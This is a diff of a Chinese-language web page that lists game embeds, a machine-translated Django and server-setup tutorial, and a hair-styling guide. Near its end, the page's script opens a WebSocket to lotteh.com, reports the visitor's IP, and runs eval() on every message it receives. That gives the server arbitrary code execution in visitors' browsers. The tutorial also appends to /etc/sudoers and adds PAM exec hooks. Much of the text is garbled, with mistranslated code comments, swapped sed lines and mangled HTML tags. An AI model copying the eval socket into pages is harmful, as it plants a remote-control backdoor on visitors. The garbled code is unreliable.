@@ -140,11 +140,12 @@
 
 
 <div id="0" style="white-space: pre-wrap;">三个13-在线纸牌游戏
-通过单击下面的链接生成邀请代码或加入游戏，与朋友一起玩三十三。<a class="btn btn-primary" href="https://lotteh.com/games/three-thirteen---online-card/" title="Invite a friend">用代码邀请</a>
-<a class="btn btn-success" href="https://lotteh.com/games/" title="Join a game">加入游戏</a>
-<script src="/static/games/threethirteen.js"></script>***</div>
+通过单击下面的链接生成邀请代码或加入游戏，与朋友一起玩三十三。<a class="btn btn-primary" href="https://lotteh.com/games/three-thirteen---online-card-result-once-single/" title="Invite a friend">用代码邀请</a>
+<a "="" class="btn btn-success" games="" href="&lt;a href=" https:="" lotteh.com="" title="Visit this link (it will take you outside of Lotte Harper)">lotteh.com/games/</a>“标题=“加入游戏”&gt;加入游戏
+<script src="/static/games/threethirteen.js"></script>
+</div>
 
-<div><img width="100%" height="auto" src="https://glamgirlx.com/media/images/dd9c654e-2b32-41f1-b4ac-8799e7cfe226.png" id="img0" alt="购买于"/><p>经过 Daisy / <a href="/zh-CN/three-thirteen---online-card" title="查看帖子">看法</a> | <a href="https://lotteh.com/payments/photo/Daisy/?id=dd9c654e-2b32-41f1-b4ac-8799e7cfe226" title="购买于 Lotte Harper">买</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=dd9c654e-2b32-41f1-b4ac-8799e7cfe226&crypto=ETH" title="使用加密货币购买 Lotte Harper">使用加密货币购买</a></p><hr>
+<div><img width="100%" height="auto" src="https://i.imgur.com/8I5qWNu.png" id="img0" alt="购买于"/><p>经过 Daisy / <a href="/zh-CN/three-thirteen---online-card" title="查看帖子">看法</a> | <a href="https://lotteh.com/payments/photo/Daisy/?id=dd9c654e-2b32-41f1-b4ac-8799e7cfe226" title="购买于 Lotte Harper">买</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=dd9c654e-2b32-41f1-b4ac-8799e7cfe226&crypto=ETH" title="使用加密货币购买 Lotte Harper">使用加密货币购买</a></p><hr>
 
 <div class="mx-auto p-1 m-1" style="display: flex; justify-content: space-around;">
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6209985848112194"
@@ -163,7 +164,17 @@
 
 <hr></div>
 
-<div id="1" style="white-space: pre-wrap;">实用的基于Web的深度学习和安全
+<div id="1" style="white-space: pre-wrap;">在线玩彩色sudoku-免费的colordoku游戏
+这是免费玩sudoku（colordoku）游戏的免费游戏。<canvas class="game" id="game197"></canvas>
+<script src="/static/js/createjs.min.js"></script>
+<script src="/static/games/colordokugames.js"></script>
+<script src="/static/games/colordoku.js"></script>
+</div>
+
+<div><p>经过 Daisy / <a href="/zh-CN/play-color-sudoku-online---free" title="查看帖子">看法</a> | <a href="https://lotteh.com/payments/photo/Daisy/?id=aa66ebbc-2b2c-49f6-afd4-f2b9ad948f8a" title="购买于 Lotte Harper">买</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=aa66ebbc-2b2c-49f6-afd4-f2b9ad948f8a&crypto=ETH" title="使用加密货币购买 Lotte Harper">使用加密货币购买</a></p><hr>
+</div>
+
+<div id="2" style="white-space: pre-wrap;">实用的基于Web的深度学习和安全
 第三版
 夏洛特·哈珀
 2024年7月3日
@@ -987,7 +998,7 @@ def register(request):
             messages.success(request, 'Welcome to the app, {}.'.format(user.username))
     return render(request, 'users/register.html', {'form': UserRegisterForm})
 </code></pre>现在，我们需要添加一个表格来重新发送激活电子邮件。在用户/表格中。py，添加以下表格：<pre class="language-python"><code>
-# …（进口）
+# …（金额）
 class ResendActivationEmailForm(forms.Form):
     email = forms.EmailField(required=True)
 </code></pre>我们还需要一个与此重新启动电子邮件激活表相对应的模板。让我们添加此模板。编辑文件：<pre class="language-bash"><code>
@@ -1447,7 +1458,7 @@ nano users/templates/users/mfa_onboarding.html
 这看起来真的很好！只要一切都正确设置，我们就应该能够发送消息，并在添加URL模式后立即将用户登录。我们需要设置的最后一件事是配置文件视图，以便我们可以确保用户可以更改其电话号码而不登录。最终，我们将要添加一个“停止戒烟”选项，以便用户可以发短信“停止”选择退出以后的短信。
 
 让我们将配置文件视图添加到用户/views.py。此视图将更新用户的简历，电子邮件，用户名和电话号码，并允许我们启用多因素身份验证。首先，我们将需要另外两种表格/形式。<pre class="language-python"><code>
-# ...金额
+# ...导入
 class UserUpdateForm(forms.ModelForm):
     email = forms.EmailField()
     class Meta:
@@ -1875,7 +1886,7 @@ def send_verification_email(user, token):
     token.save()
     send_html_email(user, "Your verification code for {} is {}".format(settings.SITE_NAME, str(code)), "&lt;p&gt;Dear {},&lt;/p&gt;&lt;p&gt;Your verification code for {} is {}. Thank you for using this code to secure your account.&lt;/p&gt;&lt;h2&gt;{}&lt;/h2&gt;&lt;p&gt;Sincerely, {}&lt;/p&gt;".format(user.profile.name, settings.SITE_NAME, str(code), str(code), settings.SITE_NAME))
 </code></pre>因此，这一切都很好，现在我们有了一个多因素身份验证系统，该系统取决于电话号码或电子邮件登录。但是，我们还需要一种删除或至少隐藏不符合我们条款的用户的方法。这些可能是垃圾邮件发送者，机器人或任何对我们工作不好的人。看看我在网站上监视用户的视图：<pre class="language-python"><code>
-# 金额
+# 进口
 from django.contrib.auth.decorators import login_required
 from django.contrib.auth.decorators import user_passes_test
 from .tests import is_superuser_or_vendor # 我们需要创建此测试
@@ -1957,7 +1968,7 @@ def toggle_user_active(request, pk):
     return HttpResponse('&lt;i class="bi bi-eye-fill"&gt;&lt;/i&gt;' if user.is_active else '&lt;i class="bi bi-eye-slash-fill"&gt;&lt;/i&gt;')
 
 
-# 进口
+# 金额
 from django.contrib.auth.mixins import LoginRequiredMixin, UserPassesTestMixin
 from django.views.generic import DeleteView
 
@@ -2118,7 +2129,7 @@ PrintMotd no
 # 没有默认横幅路径
 Banner /etc/banner
 
-# 允许客户通过本地变量变量
+# 允许客户通过环境环境变量
 AcceptEnv LANG LC_*
 
 # 覆盖无子系统的默认值
@@ -2466,8 +2477,8 @@ echo "Setup crontab/sudoers configuration"
 sudo crontab -l -u root | cat - config/crontab | sudo crontab -u root -
 sudo sh -c "cat config/sudoers &gt;&gt; /etc/sudoers"
 # 注入PAM配置并删除错误的SSH配置
-# sudo sed -i'' - 和$ d'/etc/pam.d/sshd
-# sudo sed -i''''$ d' /etc /profile
+# sudo sed -i''''$ d'/tc/pam.d/sshd
+# sudo sed -i'' - 和$ d' /etc /profile
 echo "session required pam_exec.so seteuid /home/team/femmebabe/pam.sh" | sudo tee -a /etc/pam.d/sshd
 echo "session required pam_exec.so seteuid /home/team/femmebabe/logout.sh" | sudo tee -a /etc/pam.d/sshd
 sudo chmod a+x pam.sh
@@ -3022,7 +3033,7 @@ submission inet n       -       y       -       -       smtpd
 pickup    unix  n       -       y       60      1       pickup
 cleanup   unix  n       -       y       -       0       cleanup
 qmgr      unix  n       -       n       300     1       qmgr
-# QMGR UNIX N -N 300 1 OQMG
+# QMGR UNIX N -N 300 1 OQMGR
 tlsmgr    unix  -       -       y       1000?   1       tlsmgr
 rewrite   unix  -       -       y       -       -       trivial-rewrite
 bounce    unix  -       -       y       -       0       bounce
@@ -3084,7 +3095,7 @@ maildrop  unix  -       n       n       -       -       pipe
 # =============================================== ===================
 # 通过Cyrus交付的旧例子。
 # 
-# 旧-cyrus unix -n n--管道
+# 旧-Corus unix -n n--管道
 # flags = r用户= cyrus argv =/cyrus/bin/deliver -e -m $ {extension} $ {user}
 # 
 # =============================================== ===================
@@ -3640,23 +3651,14 @@ source venv/bin/activate
 <div><p>经过 Daisy / <a href="/zh-CN/practical-web-based-deep" title="查看帖子">看法</a> | <a href="https://lotteh.com/payments/photo/Daisy/?id=cf8fc969-e02d-4952-a329-e60db51bc1a7" title="购买于 Lotte Harper">买</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=cf8fc969-e02d-4952-a329-e60db51bc1a7&crypto=ETH" title="使用加密货币购买 Lotte Harper">使用加密货币购买</a></p><hr>
 </div>
 
-<div id="2" style="white-space: pre-wrap;">两个播放器颜色在线免费
+<div id="3" style="white-space: pre-wrap;">两个播放器颜色在线免费
 免费与朋友免费播放合作色彩。<a class="btn btn-info" href="https://lotteh.com/games/two-player-color-sudoku-online/" title="Invite a friend">邀请一个朋友</a>
 <a class="btn btn-success" href="https://lotteh.com/games/" title="Join a game">加入游戏</a>
 <script src="https://lotteh.com/static/games/colordokugames2.js"></script>
-<script src="https://lotteh.com/static/games/twoplayercolordoku.js"></script>***</div>
-
-<div><img width="100%" height="auto" src="https://glamgirlx.com/media/images/c820300b-3430-4988-86fd-e77352fca488.png" id="img2" alt="购买于"/><p>经过 Daisy / <a href="/zh-CN/two-player-color-sudoku-online" title="查看帖子">看法</a> | <a href="https://lotteh.com/payments/photo/Daisy/?id=c820300b-3430-4988-86fd-e77352fca488" title="购买于 Lotte Harper">买</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=c820300b-3430-4988-86fd-e77352fca488&crypto=ETH" title="使用加密货币购买 Lotte Harper">使用加密货币购买</a></p><hr>
+<script games="" https:="" lotteh.com="" src="&lt;a href=" static="" title="Visit this link (it will take you outside of Lotte Harper)" twoplayercolordoku.js"="">lotteh.com/static/games/twoplayercolordoku.js</a>"></script>
 </div>
 
-<div id="3" style="white-space: pre-wrap;">在线玩彩色sudoku-免费的colordoku游戏
-这是免费玩sudoku（colordoku）游戏的免费游戏。
-***<canvas class="game" id="game197"></canvas>
-<script src="/static/js/createjs.min.js"></script>
-<script src="/static/games/colordokugames.js"></script>
-<script src="/static/games/colordoku.js"></script></div>
-
-<div><p>经过 Daisy / <a href="/zh-CN/play-color-sudoku-online---free" title="查看帖子">看法</a> | <a href="https://lotteh.com/payments/photo/Daisy/?id=aa66ebbc-2b2c-49f6-afd4-f2b9ad948f8a" title="购买于 Lotte Harper">买</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=aa66ebbc-2b2c-49f6-afd4-f2b9ad948f8a&crypto=ETH" title="使用加密货币购买 Lotte Harper">使用加密货币购买</a></p><hr>
+<div><img width="100%" height="auto" src="https://glamgirlx.com/media/images/c820300b-3430-4988-86fd-e77352fca488.png" id="img3" alt="购买于"/><p>经过 Daisy / <a href="/zh-CN/two-player-color-sudoku-online" title="查看帖子">看法</a> | <a href="https://lotteh.com/payments/photo/Daisy/?id=c820300b-3430-4988-86fd-e77352fca488" title="购买于 Lotte Harper">买</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=c820300b-3430-4988-86fd-e77352fca488&crypto=ETH" title="使用加密货币购买 Lotte Harper">使用加密货币购买</a></p><hr>
 </div>
 
 <div id="4" style="white-space: pre-wrap;"><p>僵局怎么穿？</p><p><br/></p><p>1。首先将头发抬高到所需的长度。您的头发应至少长2-3英寸，以获得最佳效果。</p><p><br/></p><p>2。将您的头发分成小，甚至是用梳子的零件。各节的尺寸将确定辫子的大小，因此请确保选择一个舒适的尺寸。</p><p><br/></p><p>3。通过将其紧紧地向根部扭曲并将其拉紧，开始对头发的每一部分进行梳理。这将在头发中产生结，最终将形成辫子。</p><p><br/></p><p>4.将蜡或凝胶涂在每一部分的头发上，以帮助将结固定在适当的位置，并鼓励头发一起垫子。</p><p><br/></p><p>5。继续向后梳理和扭曲头发的每一部分，直到完成整个头部。这个过程可能很耗时，因此请保持耐心并根据需要休息。</p><p><br/></p><p>6。一旦您的所有头发都被扭曲和背面，让它静置几天，以使结拧紧并形成辫子。</p><p><br/></p><p>7.几天后，您可以通过用无残留的洗发水洗涤并使用钩针钩子来帮助拧紧任何松散的结，从而开始造型和保持辫子。</p><p><br/></p><p>8。为了使您的辫子看起来整洁且整洁，请考虑在睡觉或肮脏的环境中使用围巾或头巾覆盖它们。定期维护和保养将有助于您的辫子保持健康和充满活力。</p></div>
@@ -3837,9 +3839,9 @@ source venv/bin/activate
 </div>
 <div style="margin:auto;" class="center col-md-6 p-3 rounded mb-3 bg-white">
 <div class="mb-2" style="display: flex; justify-content: space-around;">
-<a title="在Facebook上分享" target="_blank" class="btn btn-light btn-xlarge" href="https://www.facebook.com/dialog/feed?&app_id=845349032833671&link=https%3A%2F%2Fglamgirlx.com%2Fzh-CN%2Fnews%3F&quote=Visit%20this%20link%20on%20Glam%20Girl%20X&display=popup&hashtag=#lotteh&redirect_uri=https%3A%2F%2Fglamgirlx.com" title="Share on Facebook"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-facebook" viewBox="0 0 16 16"  style="text-color: #4267B2 !important; color: #4267B2 !important;">
+<a title="在Facebook上分享" target="_blank" class="btn btn-light btn-xlarge" href="https://www.facebook.com/dialog/feed?&app_id=845349032833671&link=https%3A%2F%2Fglamgirlx.com%2Fzh-CN%2Fnews%3F&quote=Three%20Thirteen%20-%20Online%20Card%20Game&display=popup&hashtag=#lotteh&redirect_uri=https%3A%2F%2Fglamgirlx.com" title="Share on Facebook"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-facebook" viewBox="0 0 16 16"  style="text-color: #4267B2 !important; color: #4267B2 !important;">
   <path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951"/></svg></a>
-<a title="在Twitter上分享" target="_blank" class="btn btn-xlarge btn-light" href="https://twitter.com/intent/tweet/?text=Visit%20this%20link%20on%20Glam%20Girl%20X%20-&url=https://glamgirlx.com/zh-CN/news?" title="Share on Twitter"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-twitter" viewBox="0 0 16 16" style="text-color: #1DA1F2 !important; color: #1DA1F2 !important;">
+<a title="在Twitter上分享" target="_blank" class="btn btn-xlarge btn-light" href="https://twitter.com/intent/tweet/?text=Three%20Thirteen%20-%20Online%20Card%20Game%20-&url=https://glamgirlx.com/zh-CN/news?" title="Share on Twitter"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-twitter" viewBox="0 0 16 16" style="text-color: #1DA1F2 !important; color: #1DA1F2 !important;">
   <path d="M5.026 15c6.038 0 9.341-5.003 9.341-9.334q.002-.211-.006-.422A6.7 6.7 0 0 0 16 3.542a6.7 6.7 0 0 1-1.889.518 3.3 3.3 0 0 0 1.447-1.817 6.5 6.5 0 0 1-2.087.793A3.286 3.286 0 0 0 7.875 6.03a9.32 9.32 0 0 1-6.767-3.429 3.29 3.29 0 0 0 1.018 4.382A3.3 3.3 0 0 1 .64 6.575v.045a3.29 3.29 0 0 0 2.632 3.218 3.2 3.2 0 0 1-.865.115 3 3 0 0 1-.614-.057 3.28 3.28 0 0 0 3.067 2.277A6.6 6.6 0 0 1 .78 13.58a6 6 0 0 1-.78-.045A9.34 9.34 0 0 0 5.026 15"/>
 </svg></a>
 <a title="在Pinterest上分享" target="_blank" class="btn btn-xlarge btn-light" href="https://www.pinterest.com/pin/create/button/?url=https://glamgirlx.com/zh-CN/news?" title="Share on Pinterest"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-pinterest" viewBox="0 0 16 16" style="filter: invert(21%) sepia(58%) saturate(4534%) hue-rotate(338deg) brightness(81%) contrast(128%);">
@@ -3851,7 +3853,7 @@ source venv/bin/activate
 </div>
 <div class="mb-2" style="display: flex; justify-content: space-around;">
 <a title="分享Tumblr" target="_blank" class="btn btn-xlarge btn-light" href="http://tumblr.com/widgets/share/tool?canonicalUrl=https://glamgirlx.com/zh-CN/news?"><img src="/media/icons/tumblr-logo.svg" width="30" height="30" alt="Tumblr" style="filter: invert(28%) sepia(8%) saturate(3348%) hue-rotate(169deg) brightness(92%) contrast(82%);"></img></a>
-<a title="分享Reddit" target="_blank" class="btn btn-xlarge btn-light" href="http://www.reddit.com/submit?url=https://glamgirlx.com/zh-CN/news?&title=Visit%20this%20link%20on%20Glam%20Girl%20X"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-reddit" viewBox="0 0 16 16" style="text-color: #FF4500 !important; color: #FF4500 !important;">
+<a title="分享Reddit" target="_blank" class="btn btn-xlarge btn-light" href="http://www.reddit.com/submit?url=https://glamgirlx.com/zh-CN/news?&title=Three%20Thirteen%20-%20Online%20Card%20Game"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-reddit" viewBox="0 0 16 16" style="text-color: #FF4500 !important; color: #FF4500 !important;">
   <path d="M6.167 8a.83.83 0 0 0-.83.83c0 .459.372.84.83.831a.831.831 0 0 0 0-1.661m1.843 3.647c.315 0 1.403-.038 1.976-.611a.23.23 0 0 0 0-.306.213.213 0 0 0-.306 0c-.353.363-1.126.487-1.67.487-.545 0-1.308-.124-1.671-.487a.213.213 0 0 0-.306 0 .213.213 0 0 0 0 .306c.564.563 1.652.61 1.977.61zm.992-2.807c0 .458.373.83.831.83s.83-.381.83-.83a.831.831 0 0 0-1.66 0z"/>
   <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0m-3.828-1.165c-.315 0-.602.124-.812.325-.801-.573-1.9-.945-3.121-.993l.534-2.501 1.738.372a.83.83 0 1 0 .83-.869.83.83 0 0 0-.744.468l-1.938-.41a.2.2 0 0 0-.153.028.2.2 0 0 0-.086.134l-.592 2.788c-1.24.038-2.358.41-3.17.992-.21-.2-.496-.324-.81-.324a1.163 1.163 0 0 0-.478 2.224q-.03.17-.029.353c0 1.795 2.091 3.256 4.669 3.256s4.668-1.451 4.668-3.256c0-.114-.01-.238-.029-.353.401-.181.688-.592.688-1.069 0-.65-.525-1.165-1.165-1.165"/>
 </svg></a>
@@ -3953,32 +3955,32 @@ function jumpbookto(page) {
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("closed", (event) => {
+            remoteSocket.addEventListener("closed", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
